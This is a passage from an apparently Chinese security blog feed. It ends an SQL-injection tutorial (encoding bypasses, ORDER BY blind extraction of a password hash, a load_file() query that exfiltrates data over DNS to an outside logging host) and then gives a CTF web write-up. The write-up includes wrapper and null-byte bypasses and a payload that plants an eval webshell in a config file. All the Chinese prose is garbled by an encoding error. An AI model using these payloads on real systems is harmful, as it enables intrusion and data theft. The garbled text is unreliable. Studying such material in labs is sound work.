unicodeç¼–ç 
å•å¼•å·ï¼š&#39;
%u0027 %u02b9 %u02bc %u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
ç©ºç™½ï¼š
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
å·¦æ‹¬å·(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
å³æ‹¬å·):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9</code></pre>
<h3 id="è¿›é˜¶æŠ€å·§"><a href="#è¿›é˜¶æŠ€å·§" class="headerlink" title="è¿›é˜¶æŠ€å·§"></a>è¿›é˜¶æŠ€å·§</h3><h4 id="1ã€order-byçš„å¦™ç”¨"><a href="#1ã€order-byçš„å¦™ç”¨" class="headerlink" title="1ã€order byçš„å¦™ç”¨"></a>1ã€order byçš„å¦™ç”¨</h4><p>ç™»é™†åœºæ™¯ï¼š</p>
<pre><code class="php">$username = $_POST[&#39;username&#39;];
$password = $_POST[&#39;password&#39;];
if(filter($username))&#123;
    //è¿‡æ»¤æ‹¬å·
&#125;else&#123;
    $sql=&quot;SELECT * FROM admin WHERE username=&#39;&quot;.$username.&quot;&#39;&quot;;
    $result=mysql_query($sql);
    @$row = mysql_fetch_array($result);
    if(isset($row) &amp;&amp; $row[&#39;username&#39;] === &#39;admin&#39;)&#123;
        if ($row[&#39;password&#39;]===md5($password))&#123;
            //Login successful
        &#125;else&#123;
            die(&quot;password error!&quot;);
        &#125;
    &#125;else&#123;
        die(&quot;username does not exist!&quot;);
    &#125;
&#125;</code></pre>
<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39;;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  18 | admin6   | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)</code></pre>
<p>é€šè¿‡<strong>order byç›²æ³¨</strong>è·å–passwordçš„å€¼ã€‚</p>
<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;5&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | 5                    |
| 18 | admin6   | 51b7a76d51e70b419f60 |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;6&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
| 18 | admin6   | 51b7a76d51e70b419f60 |
|  1 | 2        | 6                    |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;51&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
|  1 | 2        | 51                   |
| 18 | admin6   | 51b7a76d51e70b419f60 |
+----+----------+----------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;52&#39; order by 3;
+----+----------+----------------------+
| id | username | password             |
+----+----------+----------------------+
| 18 | admin6   | 51b7a76d51e70b419f60 |
|  1 | 2        | 52                   |
+----+----------+----------------------+
2 rows in set (0.00 sec)</code></pre>
<p>é€šè¿‡ä¸Šé¢çš„æŸ¥è¯¢å¯ä»¥å‘ç°ï¼ŒæŒ‰ç…§passwordåˆ—æ’åºæ—¶ï¼Œå­—ç¬¦çš„å¤§å°å½±å“ç€ä»–ä»¬çš„ä½ç½®ã€‚é€šè¿‡è°ƒæ•´æˆ‘ä»¬è®¾ç½®çš„å­—ç¬¦ï¼Œæ‰¾å‡ºå›æ˜¾å†…å®¹å˜æ¢çš„æ—¶åˆ»æ¥ç¡®å®šè¿™ä¸€ä½çš„å­—ç¬¦ã€‚</p>
<h4 id="2ã€FUZZ"><a href="#2ã€FUZZ" class="headerlink" title="2ã€FUZZ"></a>2ã€FUZZ</h4><p>é€šè¿‡Burpsuiteçš„Intruderæ¨¡å—æ¥è·‘ä¸€éFUZZè„šæœ¬ï¼Œæœ‰åŠ©äºç¡®å®šæ³¨å…¥ç‚¹å’Œé—­åˆç¬¦å·ã€‚</p>
<p>é™„ä¸Šå‡ ä¸ªFUZZå­—å…¸ï¼š</p>
<blockquote>
<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
</blockquote>
<h4 id="3ã€åœ¨ç›²æ³¨ä¸­ä½¿ç”¨-DNS-è¿›è¡Œå¤–å¸¦"><a href="#3ã€åœ¨ç›²æ³¨ä¸­ä½¿ç”¨-DNS-è¿›è¡Œå¤–å¸¦" class="headerlink" title="3ã€åœ¨ç›²æ³¨ä¸­ä½¿ç”¨ DNS è¿›è¡Œå¤–å¸¦"></a>3ã€åœ¨ç›²æ³¨ä¸­ä½¿ç”¨ DNS è¿›è¡Œå¤–å¸¦</h4><blockquote>
<p>é™åˆ¶ï¼š</p>
<p>é™¤äº†Oracle æ”¯æŒ windows å’Œ Linux ç³»ç»Ÿçš„æ”»å‡»ä»¥å¤–å…¶ä»–æ”»å‡»<strong>åªèƒ½åœ¨Windowsç¯å¢ƒä¸‹</strong></p>
<p>å¹¶ä¸”æ•°æ®ä¸­ä¸èƒ½åŒ…å«:~@ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚</p>
</blockquote>
<p>åŸç†ï¼š</p>
<p>å› ä¸ºDNSæŸ¥è¯¢æ˜¯å¯ä»¥åœ¨DNSæœåŠ¡å™¨ä¹‹å‰è½¬å‘çš„ï¼Œé‚£ä¹ˆDNSæŠ¥æ–‡å°±èƒ½ä»å®‰å…¨ç³»ç»Ÿå†…è½¬å‘å‡ºæ¥ã€‚DNSåœ¨è§£ææ—¶ä¼šç•™ä¸‹æ—¥å¿—ï¼Œé€šè¿‡è¯»å–å¤šçº§åŸŸåçš„è§£ææ—¥å¿—ï¼Œè·å–è¯·æ±‚ä¿¡æ¯ã€‚å³ä½¿å‡è®¾æœåŠ¡å™¨ä¸å…è®¸è¿æ¥å…¬ç½‘ï¼Œå¦‚æœç›®æ ‡ä¸»æœºèƒ½å¤Ÿè§£æä»»æ„åŸŸåï¼Œä¹Ÿèƒ½å¤Ÿé€šè¿‡ DNS æŸ¥è¯¢è½¬å‘è¿›è¡Œæ•°æ®å¤–å¸¦ã€‚è€Œè¿™ç§ DNS å¤–å¸¦çš„æ–¹å¼ï¼Œå¯ä»¥ä½¿å¾—æ”»å‡»è€…é€šè¿‡ä»æ˜“å—æ”»å‡»çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå‘å‡ºç‰¹åˆ¶çš„DNSè¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ç«¯æ‹¦æˆªæ¥æŸ¥çœ‹æ¶æ„SQLæŸ¥è¯¢ï¼ˆä¾‹å¦‚ç®¡ç†å‘˜å¯†ç ï¼‰çš„ç»“æœã€‚</p>
<p><img src="https://i.loli.net/2020/01/08/1jepZE8CDhKLMmV.png"></p>
<p>Mysqlç›¸å¯¹äºOracleæ¥è¯´å¯åˆ©ç”¨æ–¹æ³•å•ä¸€ä¸”éœ€è¦ä¸€å®šçš„æ¡ä»¶ã€‚</p>
<p><code>secure_file_priv</code>è®¾ç½®ä¸ºç©ºã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<p>ä½¿ç”¨DnsLogå¹³å°ï¼š<a href="http://ceye.io/">http://ceye.io</a></p>
<pre><code> select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.juqh6m.ceye.io\\abc&#39;));</code></pre>
<p><img src="https://i.loli.net/2020/01/08/NqI3KODrRvVe8A1.png"><br><img src="https://i.loli.net/2020/01/08/v34gqLR9MB1sDkF.png"></p>
<p><strong>å‚è€ƒé“¾æ¥</strong></p>
<blockquote>
<p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
<p><a href="http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/">http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/</a></p>
<p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
<p><a href="https://p0sec.net/index.php/archives/106/">https://p0sec.net/index.php/archives/106/</a></p>
<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf">https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf</a></p>
</blockquote>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="åŸºç¡€çŸ¥è¯†-1"><a href="#åŸºç¡€çŸ¥è¯†-1" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3>]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>Sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>å°ç»„å†…éƒ¨èµ›(04-16)WriteUp</title>
    <url>/2017/04/20/xiao-zu-nei-bu-sai-04-16-writeup/</url>
    <content><![CDATA[<h1 id="å°ç»„å†…éƒ¨èµ›-04-16-WriteUp"><a href="#å°ç»„å†…éƒ¨èµ›-04-16-WriteUp" class="headerlink" title="å°ç»„å†…éƒ¨èµ›(04-16)WriteUp"></a>å°ç»„å†…éƒ¨èµ›(04-16)WriteUp</h1><h2 id="0X01-WEB"><a href="#0X01-WEB" class="headerlink" title="0X01 WEB"></a>0X01 WEB</h2><h4 id="1-åœŸè±ªæ‰èƒ½ç”¨çš„æœºå™¨ï¼ˆ50åˆ†ï¼‰"><a href="#1-åœŸè±ªæ‰èƒ½ç”¨çš„æœºå™¨ï¼ˆ50åˆ†ï¼‰" class="headerlink" title="1.åœŸè±ªæ‰èƒ½ç”¨çš„æœºå™¨ï¼ˆ50åˆ†ï¼‰"></a>1.åœŸè±ªæ‰èƒ½ç”¨çš„æœºå™¨ï¼ˆ50åˆ†ï¼‰</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/223925082.png" alt="mark"></p>
<p>â€‹    æåˆ°äº†MACï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„burpæŠ“åŒ…ï¼Œæ”¹UAï¼Œä¸è¡Œã€‚é‚£è¿™é‡Œå°±è‚¯å®šæ˜¯å…³äºä»€ä¹ˆwindowså’ŒMAC OSçš„å·®å¼‚äº†ã€‚åæ¥çŸ¥é“äº†<a href="http://baike.baidu.com/link?url=awCBaGWuc6cZQA4MPfltaz-0qsv9GC2LwMzKrK3mAdry9lmQ4GWK6NYXS8x0zsi2OxkZTMCONS2GFjF7MwBYeCJMqzFRZMQG93Ut_YdiKsW">.DS_Store</a>åç¼€çš„æ–‡ä»¶æ˜¯MACæ‰ä¼šäº§ç”Ÿçš„ä¸€ç±»æ–‡ä»¶ï¼Œ<code>http://115.159.197.62:7001/.DS_Store</code>ä¸‹è½½ä¸‹æ¥è¯¥æ–‡ä»¶ï¼Œæ‰“å¼€å°±getåˆ°flagäº†ã€‚</p>
<blockquote>
<p>è¿™ä¸ªçœŸçš„æ˜¯æ¶¨å§¿åŠ¿äº†ï¼Œç¬¬ä¸€æ¬¡è§ã€‚</p>
</blockquote>
<h4 id="2-å¿…é¡»æ˜¯æ•°å­—ï¼ˆ150åˆ†ï¼‰"><a href="#2-å¿…é¡»æ˜¯æ•°å­—ï¼ˆ150åˆ†ï¼‰" class="headerlink" title="2.å¿…é¡»æ˜¯æ•°å­—ï¼ˆ150åˆ†ï¼‰"></a>2.å¿…é¡»æ˜¯æ•°å­—ï¼ˆ150åˆ†ï¼‰</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/224840375.png" alt="mark"></p>
<p>æ‰“å¼€åé™¤äº†è¿™ä¸ªæ²¡åˆ«çš„ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°æœ‰ä¸œè¥¿ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/225004984.png" alt="mark"></p>
<p>vimï¼Œyou love vimï¼è‚¯å®šæœ‰å…³ç³»ã€‚è¿™é‡Œæƒ³åˆ°vimå¤‡ä»½æ–‡ä»¶<code>.swp</code>ï¼ˆå’Œä¸Šæ¬¡zctfçš„è›¤ä¸€æ ·ï¼‰ï¼Œ<code> .index.php.swp</code>ä¸‹ä¸‹æ¥æºç çœ‹çœ‹ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/225843618.png" alt="mark"></p>
<p>æåˆ°äº†f149.phpï¼Œè®¿é—®çœ‹æºç ï¼Œè€ƒå¯Ÿä»£ç å®¡è®¡ã€‚</p>
<pre><code>&lt;!--
    if (isset ($_GET[&#39;flag&#39;])) &#123;
    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;flag&#39;]) === FALSE)
        echo &#39;only number is admitted&#39;;
    else if (strpos ($_GET[&#39;flag&#39;], &#39;flag&#39;) !== FALSE)
        die(&#39;Flag: &#39;.$flag);
    else
        echo &#39;getflag fail~&#39;;
&#125;



--&gt;</code></pre>
<p>â€‹    è¦æ±‚æäº¤çš„æ•°æ®åªèƒ½æ˜¯æ•°å­— è¿˜å¾—è¦åŒ…å«flagå­—ç¬¦ä¸²ï¼Œè¿™é‡Œåˆ©ç”¨00æˆªæ–­æ¥å®ç°ã€‚æäº¤<code>115.159.197.62:8008/f149.php?flag=1%00flag</code>å¾—åˆ°flagã€‚ä¸è¿‡å½“æ—¶ç”¨çš„flag[]ä¹Ÿå¾—åˆ°äº†flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170417/234217075.png" alt="mark"></p>
<h4 id="3-è¾“å…¥å¯†ç ï¼ˆ150åˆ†ï¼‰"><a href="#3-è¾“å…¥å¯†ç ï¼ˆ150åˆ†ï¼‰" class="headerlink" title="3.è¾“å…¥å¯†ç ï¼ˆ150åˆ†ï¼‰"></a>3.è¾“å…¥å¯†ç ï¼ˆ150åˆ†ï¼‰</h4><p>â€‹    è¿™ä¸ªé¢˜æœ¬èº«ä¸éš¾ï¼Œä½†æ˜¯ã€‚ã€‚å¤ªå¥—è·¯ã€‚æºç </p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
check
&lt;/head&gt;
&lt;body&gt;
please input the password
&lt;/body&gt;
&lt;/html&gt;
&lt;!--

    if (isset($_GET[&#39;a&#39;])) &#123;  
    if (strcmp($_GET[&#39;a&#39;], $flag) == 0)  
        die(&#39;Flag: &#39;.$flag);  
    else  
        print &#39;you are close&#39;;  
    &#125;

--&gt;</code></pre>
<p>çœ‹åˆ°strcmp()å‡½æ•°åº”è¯¥æ˜ç™½è¯¥å¹²ä»€ä¹ˆäº†ï¼ˆä¼šå¿ƒä¸€ç¬‘ï¼‰ï¼Œåˆ©ç”¨phpå¼±ç±»å‹ã€‚</p>
<blockquote>
<p>strcmp()å‡½æ•°åœ¨PHPå®˜æ–¹æ‰‹å†Œä¸­çš„æè¿°æ˜¯int strcmp ( string $str1 , string $str2 ),éœ€è¦ç»™strcmp()ä¼ é€’2ä¸ªstringç±»å‹çš„å‚æ•°ã€‚å¦‚æœstr1å°äºstr2,è¿”å›-1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1ã€‚strcmpå‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²çš„æœ¬è´¨æ˜¯å°†ä¸¤ä¸ªå˜é‡è½¬æ¢ä¸ºasciiï¼Œç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç„¶åæ ¹æ®è¿ç®—ç»“æœæ¥å†³å®šè¿”å›å€¼ã€‚</p>
<pre><code>$array=[1,2,3];
var_dump(strcmp($array,&#39;123&#39;)); //null,åœ¨æŸç§æ„ä¹‰ä¸Šnullä¹Ÿå°±æ˜¯ç›¸å½“äºfalseã€‚</code></pre>
</blockquote>
<p>å¥—è·¯åœ¨å“ªå‘¢ï¼Ÿpostçš„ä¸æ˜¯a[]ï¼Œè€Œæ˜¯password[],è°è®©ä»–è¯´äº†è¾“å…¥å¯†ç ï¼ˆpasswordï¼‰å‘¢ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170418/000801070.png" alt="mark"></p>
<h4 id="4-è¯·åŠªåŠ›çš„å¾®ç¬‘ï¼ˆ150åˆ†ï¼‰"><a href="#4-è¯·åŠªåŠ›çš„å¾®ç¬‘ï¼ˆ150åˆ†ï¼‰" class="headerlink" title="4.è¯·åŠªåŠ›çš„å¾®ç¬‘ï¼ˆ150åˆ†ï¼‰"></a>4.è¯·åŠªåŠ›çš„å¾®ç¬‘ï¼ˆ150åˆ†ï¼‰</h4><p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170418/205305667.png" alt="mark"></p>
<p>â€‹    æ—¢ç„¶èƒ½çœ‹æºç ï¼Œé‚£çœ‹çœ‹æºç ï¼Œå¦‚ä¸‹ã€‚</p>
<pre><code>ï»¿&lt;?php   
    error_reporting(0); 
    header(&quot;Content-type: text/html; charset=utf-8&quot;); 
    if (isset($_GET[&#39;view-source&#39;])) &#123;  
        show_source(__FILE__);  
        exit();  
    &#125;  

    include(&#39;flag.php&#39;);  

    $smile = 1;   

   if (!isset ($_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/\./&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/%/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/[0-9]/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/http/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;   
    if (preg_match (&#39;/https/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;   
    if (preg_match (&#39;/ftp/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/telnet/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;   
    if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0;  
    if ($smile) &#123;  
        if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0;   
    &#125;   
    if ($smile) &#123;  
        $smile = @file_get_contents ($_GET[&#39;^_^&#39;]);   
        if ($smile === &quot;(~^o^~)&quot;) die($flag);   
    &#125;   
?&gt;   
&lt;!doctype html&gt;  
&lt;html lang=&quot;en&quot;&gt;  

&lt;head&gt;  
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;  
&lt;title&gt;Show me your smile :)&lt;/title&gt;  
&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;  
&lt;/head&gt;  

&lt;body&gt;  
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;  
&lt;div class=&quot;loginform cf&quot;&gt;  
    &lt;form name=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot; accept-charset=&quot;utf-8&quot;&gt;  
        &lt;ul&gt;  
            &lt;li&gt;  
                &lt;label for=&quot;SMILE&quot;&gt;è¯·ä½¿ç”¨å¾®ç¬‘è¿‡å…³&lt;a href=&quot;?view-source&quot;&gt;view&lt;/a&gt;&lt;/label&gt;  
                &lt;input type=&quot;text&quot; name=&quot;T_T&quot; placeholder=&quot;where is your smile&quot; required&gt;  
            &lt;/li&gt;  
            &lt;li&gt;&lt;input type=&quot;submit&quot; value=&quot;Show&quot;&gt; &lt;/li&gt;  
        &lt;/ul&gt;  
    &lt;/form&gt;  
&lt;/div&gt;  
&lt;div style=&quot;text-align:center;clear:both&quot;&gt;  
&lt;/div&gt;  
&lt;/body&gt;  

&lt;/html&gt; </code></pre>
<p>çœ‹ä¸€ä¸‹è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</p>
<p>1.å‚æ•°ä¸º^_^</p>
<p>2.æäº¤çš„æ•°æ®ä¸­ä¸èƒ½æœ‰<code>. % [0-9] http https ftp telnet</code>ï¼Œ</p>
<p>3.^_^ä¸­çš„<code>_</code>ä¸èƒ½å‡ºç°ï¼Œå› ä¸º<code>if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0;  </code></p>
<p>4<code>.if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0; </code>,æ‰€ä»¥è¦æ»¡è¶³<code>$_GET[&#39;^_^&#39;]</code>ä¸å­˜åœ¨</p>
<p>5<code>.$smile</code>ä¸ä¸º0</p>
<p>6.<code>$smile</code>çš„å€¼æ˜¯(<del>^o^</del>)</p>
<p>ç»¼ä¸Šï¼Œ3å¯ä»¥ç”¨urlç¼–ç æ›¿ä»£ä¸‹åˆ’çº¿ï¼Œ4å’Œå…¶ä»–çŸ›ç›¾ï¼Œ6è¦è¯»å–æ–‡ä»¶ï¼Œåªèƒ½å†™å…¥æˆ–åŒ…å«ã€‚payloadï¼š<code>?^%5F^=data://filter/text/plain,(%7e%5eo%5e%7e)</code>,<a href="http://php.net/manual/zh/wrappers.php">å‚è€ƒphpæ”¯æŒçš„åè®®</a>.</p>
<blockquote>
<p><strong>file_get_contents()</strong> æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å°†åœ¨å‚æ•° <code>offset</code> æ‰€æŒ‡å®šçš„ä½ç½®å¼€å§‹è¯»å–é•¿åº¦ä¸º <code>maxlen</code> çš„å†…å®¹ã€‚å¦‚æœå¤±è´¥ï¼Œ<strong>file_get_contents()</strong> å°†è¿”å› <strong>FALSE</strong>ã€‚</p>
<p>file_exists() å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚</p>
<p>å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p>
<p>$_SERVER[â€œQUERY_STRINGâ€]</p>
<p>è¯´æ˜ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²</p>
</blockquote>
<h4 id="5-æ³„éœ²äº†ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼ˆ150åˆ†ï¼‰"><a href="#5-æ³„éœ²äº†ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼ˆ150åˆ†ï¼‰" class="headerlink" title="5.æ³„éœ²äº†ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼ˆ150åˆ†ï¼‰"></a>5.æ³„éœ²äº†ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼ˆ150åˆ†ï¼‰</h4><p>â€‹    æºç æ³„éœ²ï¼Œindex.zipxä¸‹è½½æºç ã€‚</p>
<pre><code>&lt;?php
extract($_GET);
include(&#39;flag.php&#39;);
if (!empty($dpc))
&#123;
$combination = trim(file_get_contents($filename));
if ($dpc === $combination)
&#123;
echo &quot;&lt;p&gt;Hello:&quot; .&quot; $combination!?&lt;/p&gt;&quot;;
echo &quot;&lt;p&gt;Congratulation!!! flag is:&quot; .&quot; $flag&lt;/p&gt;&quot;;
&#125;
else
&#123;
echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
&#125;
&#125;
?&gt;</code></pre>
<p>å˜é‡è¦†ç›–ï¼Œæ„é€ payloadï¼š?dpc=1&amp;filename=php://inputï¼Œpostï¼š1.</p>
<h4 id="6-php-regrexï¼ˆ200åˆ†ï¼‰"><a href="#6-php-regrexï¼ˆ200åˆ†ï¼‰" class="headerlink" title="6.php regrexï¼ˆ200åˆ†ï¼‰"></a>6.php regrexï¼ˆ200åˆ†ï¼‰</h4><p>æ­£åˆ™è¡¨è¾¾å¼ï¼Œæºç ~</p>
<pre><code>
regrex is good~~&lt;!--

$str = highlight_file(&#39;2.php&#39;,true);
$key=&#39;KEY&#123;********************************&#125;&#39;;
$IsMatch= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]));
if( $IsMatch )&#123;
  die(&#39;key: &#39;.$str);
&#125;


--&gt;
</code></pre>
<p>payload:<code>?id=keykeykeykeykeykeykey:/a/aakeya:]</code></p>
<h4 id="7-ä¿¡æ¯æ”¶å½•ï¼ˆ150åˆ†ï¼‰"><a href="#7-ä¿¡æ¯æ”¶å½•ï¼ˆ150åˆ†ï¼‰" class="headerlink" title="7.ä¿¡æ¯æ”¶å½•ï¼ˆ150åˆ†ï¼‰"></a>7.ä¿¡æ¯æ”¶å½•ï¼ˆ150åˆ†ï¼‰</h4><pre><code>function new_addslashes($string)&#123;
    if(!is_array($string)) 
        return addslashes($string);
    foreach($string as $key =&gt; $val) 
        $string[$key] = new_addslashes($val);
    return $string;
&#125;

$_POST = new_addslashes($_POST);
$_GET = new_addslashes($_GET);
$_REQUEST = new_addslashes($_REQUEST);
$_COOKIE = new_addslashes($_COOKIE);

$data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;
$user_config = &quot;&lt;\?php \n&quot;;
foreach($data as $key =&gt; $value)&#123;
    $key = strtoupper($key);
    $user_config .= &quot;define($key, &#39;$value&#39;);\n&quot;; 
&#125;

@file_put_contents(&#39;user_config.php&#39;, $user_config);</code></pre>
<p>dataçš„ä¼ é€’æ˜¯ç”¨æ•°ç»„çš„å½¢å¼ï¼Œè¿‡æ»¤åªè¿‡æ»¤äº†valçš„å€¼ï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤keyï¼Œåˆ©ç”¨è¿™getshellï¼Œpostï¼š</p>
<pre><code>data[&#39;name&#39;,&#39;1&#39;);/*]=*/eval($_POST[a]);//</code></pre>
<p>è¿™é‡Œï¼Œ<code>$user_config .= &quot;define($key, &#39;$value&#39;);\n&quot;; </code>è¿™å¥è¯é‡Œï¼Œä¼ è¿›å»çš„dataæŠŠ]æ³¨é‡Šäº†ï¼Œç„¶åä»£ç å°±è¢«æ”¹æˆäº†<code>$user_config .= &quot;define($key, &#39;1&#39;);/*]=*/eval($_POST[a]);//);\n&quot;;</code>,è¿™æ ·ä¸€å¥è¯å°±å†™å…¥äº†user_configé¡µé¢ï¼Œèœåˆ€è¿æ¥ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234334412.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234349851.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170420/234400769.png" alt="mark"></p>
<h4 id="8-å£çº¸å¤§å…¨ï¼ˆ200åˆ†ï¼‰"><a href="#8-å£çº¸å¤§å…¨ï¼ˆ200åˆ†ï¼‰" class="headerlink" title="8.å£çº¸å¤§å…¨ï¼ˆ200åˆ†ï¼‰"></a>8.å£çº¸å¤§å…¨ï¼ˆ200åˆ†ï¼‰</h4><p>å£çº¸å¯ä»¥ä¸‹è½½ï¼Œè€ƒè™‘åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚æŸ¥çœ‹ä¸‹è½½é“¾æ¥å¾—çŸ¥<code>/download.php?url=filename </code>å¯ä»¥ä¸‹è½½æ–‡ä»¶ã€‚</p>
<ul>
<li>index.php</li>
<li>display.php</li>
<li>download.php</li>
<li>config.inc.php</li>
<li>api.php</li>
<li>json</li>
</ul>
<p>å½“æ—¶ä¹±è¯•ä¸çŸ¥é“ä¸‹ä»€ä¹ˆã€‚</p>
<p>æ³¨æ„ä¸€äº›å…³é”®çš„æ–‡ä»¶åã€‚ä¸‹ä¸‹æ¥åè¿›è¡Œä»£ç å®¡è®¡ï¼Œçªç ´å£åœ¨api.phpã€‚</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;json.php&quot;;
$config = include &quot;config.inc.php&quot;;
if (isset($_GET[&#39;img_first&#39;]) and isset($_GET[&#39;img_num&#39;]))&#123;
$img_first = $_GET[&#39;img_first&#39;];
$img_num = $_GET[&#39;img_num&#39;];
$conn = mysqli_connect($config[&#39;db_host&#39;],$config[&#39;db_user&#39;],$config
if (mysqli_connect_errno($conn))&#123;
die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
&#125;
$check = is_numeric($img_num) and is_numeric($img_first);
if (!$check)&#123;
$img_num = intval($img_num);
$img_first = intval($img_first);
&#125;
 $sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
$result = mysqli_query($conn,$sql);
$i = 0;
while($row=mysqli_fetch_array($result,MYSQLI_ASSOC))&#123;
$rows[$i] = $row;
$i++;
&#125;
$json = new Services_JSON();
echo $json-&gt;encode(array(&#39;result&#39;=&gt;$rows));
//echo json_encode(array(&#39;result&#39;=&gt;$rows),JSON_UNESCAPED_SLASHES);
&#125;else &#123;
die(&quot;Missing parameter img_first or img_num&quot;);
&#125;</code></pre>
<p>getäº†2ä¸ªå‚æ•°ï¼Œ<code>img_first</code>å’Œ<code>img_num</code>,<code>$check =â€¦â€¦â€¦â€¦ </code>å¯¹å‚æ•°åšäº†è¿‡æ»¤ï¼Œå¦‚æœä¸ä¸ºæ•°å­—ï¼Œè½¬ä¸ºæ•°å­—ã€‚</p>
